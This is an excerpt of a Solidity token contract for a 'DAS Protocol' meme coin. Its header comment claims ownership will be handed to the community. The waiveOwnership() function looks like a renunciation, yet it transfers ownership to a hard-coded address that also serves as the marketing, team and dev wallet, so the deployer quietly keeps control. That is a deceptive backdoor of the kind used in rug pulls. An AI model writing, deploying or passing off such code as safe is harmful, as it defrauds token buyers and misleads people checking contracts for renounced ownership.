...
/**
 * DAS BESTE COIN 
 THE new 1000x social media trend coin, contract will be deployed and hand it to comunity, from now on you run this my childs, 
 create a Twitter account, TG and so on and moon this. LFG
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xf4674Afbe2527c8Da74a18e0c27caEf0ebd5Eb73));
        _owner = address(0xf4674Afbe2527c8Da74a18e0c27caEf0ebd5Eb73);
    }
...
contract DAS is Context, IERC20, Ownable {
    ...
    string private _name = "DAS Protocol";
    string private _symbol = "DAS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xf4674Afbe2527c8Da74a18e0c27caEf0ebd5Eb73);
    address payable public teamWalletAddress = payable(0xf4674Afbe2527c8Da74a18e0c27caEf0ebd5Eb73);

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public addressDev = 0xf4674Afbe2527c8Da74a18e0c27caEf0ebd5Eb73;
